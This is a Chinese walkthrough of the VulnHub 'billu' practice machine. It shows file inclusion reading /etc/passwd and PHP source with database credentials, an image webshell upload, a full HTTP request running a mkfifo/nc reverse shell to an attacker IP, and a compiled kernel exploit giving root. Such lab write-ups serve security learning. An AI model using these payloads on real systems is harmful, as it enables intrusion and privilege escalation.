# 靶机信息
billu是vulnhub中的一台简单难度的渗透测试靶机

# 初始信息枚举
tcp端口扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
└─$ sudo nmap -sT -sV -p22,80 -O 192.168.218.195 -oA nmapScan/detail
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 12:47 EDT
Nmap scan report for 192.168.218.195
Host is up (0.00055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:21:56:B7 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (98%), Linux 3.10 - 4.11 (94%), Linux 3.13 - 4.4 (94%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```
udp没有端口开放
漏洞扫描没有扫出来什么信息

# web枚举
目录扫描
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
└─$ gobuster dir -u http://192.168.218.195 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.195
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.218.195/images/]
/test                 (Status: 200) [Size: 72]
/test.php             (Status: 200) [Size: 72]
/add                  (Status: 200) [Size: 307]
/add.php              (Status: 200) [Size: 307]
/c.php                (Status: 200) [Size: 1]
/c                    (Status: 200) [Size: 1]
/index.php            (Status: 200) [Size: 3267]
/index                (Status: 200) [Size: 3267]
/panel.php            (Status: 302) [Size: 2469] [--> index.php]
/panel                (Status: 302) [Size: 2469] [--> index.php]
/show                 (Status: 200) [Size: 1]
/show.php             (Status: 200) [Size: 1]
/in                   (Status: 200) [Size: 47531]
/in.php               (Status: 200) [Size: 47535]
/uploaded_images      (Status: 301) [Size: 328] [--> http://192.168.218.195/uploaded_images/]
/server-status        (Status: 403) [Size: 296]
/head                 (Status: 200) [Size: 2793]
/head.php             (Status: 200) [Size: 2793]
/phpmy                (Status: 301) [Size: 318] [--> http://192.168.218.195/phpmy/]
/index.php            (Status: 200) [Size: 3267]
/index                (Status: 200) [Size: 3267]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================
```
有很多目录可以访问，全部curl下来
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
└─$ for dir in $(cat dir | awk -F '\(' '{print $1}' | tr -d '/' );do curl http://192.168.218.195/$dir > $dir ;done 
```
先看主页，明确是sql注入，手注加sqlmap都没注入进去。
先看看别的路径，访问 add.php 弹出来一个上传页面，但是没有任何回显
访问 in 有 phpinfo() 回显
访问panel会重定向到index
访问phpmy有phpmyamdin管理端
访问test.php有回显说file参数是空的，添加file参数，好像包含不出什么东西。再试一下post提交，确实有文件包含
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]
└─$ curl -X POST --data 'file=../../../../../../../../../etc/passwd' http://192.168.218.195/test.php
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```

访问uploaded_images有三张图片。

利用文件包含看一下index.php源码
```
<?php                                                                                                                                                                                               
session_start();                                                                                                                                                                                    
                                                                                                                                                                                                    
include('c.php');                                                                                                                                                                                   
include('head.php');                                                                                                                                                                                
if(@$_SESSION['logged']!=true)                                                                                                                                                                      
{                                                                                                                                                                                                   
        $_SESSION['logged']='';

}

if($_SESSION['logged']==true &&  $_SESSION['admin']!='')
{

        echo "you are logged in :)";
        header('Location: panel.php', true, 302); 
}
else
{
echo '<div align=center style="margin:30px 0px 0px 0px;">
<font size=8 face="comic sans ms">--==[[ billu b0x ]]==--</font> 
<br><br>
Show me your SQLI skills <br>
<form method=post>
Username :- <Input type=text name=un> &nbsp Password:- <input type=password name=ps> <br><br>
<input type=submit name=login value="let\'s login">';
}
if(isset($_POST['login']))
{
        $uname=str_replace('\'','',urldecode($_POST['un']));
        $pass=str_replace('\'','',urldecode($_POST['ps']));
        $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
        $result = mysqli_query($conn, $run);
if (mysqli_num_rows($result) > 0) {

$row = mysqli_fetch_assoc($result);
           echo "You are allowed<br>";
           $_SESSION['logged']=true;
           $_SESSION['admin']=$row['username'];
           
         header('Location: panel.php', true, 302);
    
}
else
{
        echo "<script>alert('Try again');</script>";
}

}
echo "<font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\">B0X Powered By <font color=#ff9933>Pirates</font> ";

?>
```
源码开头有包含 c.php 问价，也扒拉下来看一看
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/billu]
└─$ curl -X POST --data 'file=c.php' http://192.168.218.195/test.php            
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>
```
是连接数据库的文件，暴露了数据库的用户名和密码，可以使用 **billu:b0x_billu** 连接phpmy，有三张表，除了第一张提供一组凭据 **biLLu:hEx_it** 连不上ssh

<img width="1919" height="915" alt="Image" src="https://github.com/user-attachments/assets/7e73eaab-bf5c-42af-a297-82003da5038c" />

回头再看看源码，利用一下sql注入，不对，上面的凭据可以直接登录进去。
点击继续，出现文件上传功能。提醒`i told you dear, only png,jpg and gif file are allowed`
扒一下源码
```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                                                                                                                     
└─$ curl -X POST --data 'file=panel.php' http://192.168.218.195/test.php                                                                                                                            
<?php                                                                                                                                                                                               
session_start();                                                                                                                                                                                    
                                                                                                                                                                                                    
include('c.php');                                                                                                                                                                                   
include('head2.php');                                                                                                                                                                               
if(@$_SESSION['logged']!=true )                                                                                                                                                                     
{                                                                                                                                                                                                   
                header('Location: index.php', true, 302);                                                                                                                                           
                exit();                                                                                                                                                                             
                                                                                                                                                                                                    
}                                                                                                                                                                                                   
                                                                                                                                                                                                    
                                                                                                                                                                                                    
                                                                                                                                                                                                    
echo "Welcome to billu b0x ";                                                                                                                                                                       
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';                                                                                        
if(isset($_POST['lg']))                                                                                                                                                                             
{                                                                                                                                                                                                   
        unset($_SESSION['logged']);                                                                                                                                                                 
        unset($_SESSION['admin']);                                                                                                                                                                  
        header('Location: index.php', true, 302);                                                                                                                                                   
}                                                                                                                                                                                                   
echo '<hr><br>';                                                                                                                                                                                    
                                                                                                                                                                                                    
echo '<form method=post>                                                                                                                                                                            
                                                                                                                                                                                                    
<select name=load>                                                                                                                                                                                  
    <option value="show">Show Users</option>                                                                                                                                                        
        <option value="add">Add User</option>                                                                                                                                                       
</select>                                                                                                                                                                                           
                                                                                                                                                                                                    
 &nbsp<input type=submit name=continue value="continue"></form><br><br>';                                                                                                                           
if(isset($_POST['continue']))                                                                                                                                                                       
{                                                                                                                                                                                                   
        $dir=getcwd();                                                                                                                                                                              
        $choice=str_replace('./','',$_POST['load']);                                                                                                                                                
                                                                                                                                                                                                    
        if($choice==='add')                                                                                                                                                                         
        {                                                                                                                                                                                           
                include($dir.'/'.$choice.'.php');   
if($choice==='add')                                                                                                                                                                         
        {                                                                                                                                                                                           
                include($dir.'/'.$choice.'.php');                                                                                                                                                   
                        die();
        }

        if($choice==='show')
        {
         
                include($dir.'/'.$choice.'.php'); 
                die();
        }
        else
        {
                include($dir.'/'.$_POST['load']); 
        }

}


if(isset($_POST['upload']))
{

        $name=mysqli_real_escape_string($conn,$_POST['name']);
        $address=mysqli_real_escape_string($conn,$_POST['address']);
        $id=mysqli_real_escape_string($conn,$_POST['id']);

        if(!empty($_FILES['image']['name']))
        {
                $iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
        $r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
        $image=array('jpeg','jpg','gif','png');
        if(in_array($r,$image))
        {
                $finfo = @new finfo(FILEINFO_MIME); 
        $filetype = @$finfo->file($_FILES['image']['tmp_name']);
                if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
                                {
                                        if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
                                                         {
                                                          echo "Uploaded successfully ";
                                                          $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')'; 
                                                         mysqli_query($conn, $update);
                                                      }
                                }
                        else
                        {
                                echo "<br>i told you dear, only png,jpg and gif file are allowed"; 
                        }
        }
        else
        {
                echo "<br>only png,jpg and gif file are allowed";

        }
}


}

?>
```

查看源码，上面的show功能也有文件包含漏洞。
这里add上传文件并写入数据库，上传信息跟数据库格式差不多，上传的位置在/uploaded_images/下

<img width="1919" height="914" alt="Image" src="https://github.com/user-attachments/assets/ca20a1fe-a3cf-40a9-a984-d39f98623bb8" />

随便上传一张图片上去，确实在数据库保存了信息，看看怎么上传木马上去

<img width="1911" height="886" alt="Image" src="https://github.com/user-attachments/assets/eeb9d87a-45a9-4417-9e01-e5b4f3802b90" />
上传图片马上去，再利用上面的show功能包含文件，执行图片马，成功执行命令，开始拿shell

<img width="1597" height="867" alt="Image" src="https://github.com/user-attachments/assets/0ab0c900-0f65-41f9-a2be-4aafad71598b" />

我使用的管道马拿shell

```
POST /panel.php?cmd=rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/bash+-i+2>%261+|+nc+192.168.218.148+4444+>+/tmp/f  HTTP/1.1
Host: 192.168.218.195
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.218.195
Connection: keep-alive
Referer: http://192.168.218.195/panel.php
Cookie: PHPSESSID=ppjg63dvsubk192fckedl233t5
Upgrade-Insecure-Requests: 1
Priority: u=0, i

load=uploaded_images/abc.jpg&continue=continue
```

# 提权

最后的提权部分我就卡住了，翻找了很久也没找到什么信息，最后还是看了提示。有配置文件密码重用，和内核提权

```
┌──(kali㉿kali)-[~/…/writeup/vulnhub/billu/web]                                                   │
└─$ searchsploit 3.13.0                                                                           │
---------------------------------------------------------------- ---------------------------------│
 Exploit Title                                                  |  Path                           │
---------------------------------------------------------------- ---------------------------------│
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ' | linux/local/37292.c             │
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ' | linux/local/37293.txt           │
Unified Remote 3.13.0 - Remote Code Execution (RCE)             | windows/remote/51309.py         │
---------------------------------------------------------------- ---------------------------------│
Shellcodes: No Results   
```

```
www-data@indishell:/tmp$ gcc 3  -o payload
gcc 37292.c -o payload
www-data@indishell:/tmp$ ls
ls
37292.c  f  payload
www-data@indishell:/tmp$ ./payload
./payload
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
whoami
root
# 
```
提权成功
另一种就是找  **/var/www/phpmy/config.inc.php** 文件，里面有数据库root用户和密码，使用ssh可以重用密码。
# 反思
漏洞利用主要文件包含漏洞利用、php代码审计、sql注入原理、图片木马，反弹shell的使用和url编码技巧。靶机本身不难，但是综合利用还是有很多技巧和思路的。比如在利用图片马的时候就必须使用当前页面的show功能的文件包含才能执行木马，这里也很容易疏忽导致图片马无法成功利用，这个靶机还是非常不错的。